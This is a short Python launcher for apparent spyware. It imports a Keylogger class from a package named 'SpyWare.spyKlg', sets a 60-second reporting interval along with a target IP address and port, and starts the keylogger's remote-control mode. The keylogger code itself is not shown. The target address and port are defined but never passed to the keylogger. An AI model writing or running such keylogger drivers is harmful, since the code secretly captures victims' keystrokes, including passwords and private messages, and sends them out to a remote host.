from SpyWare.spyKlg import Keylogger

if __name__ == "__main__":
    SEND_REPORT_EVERY = 60  # in seconds/1 minute.
    TARGET_IP = '192.168.0.23'
    TARGET_PORT = 12345
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start_remote_control()
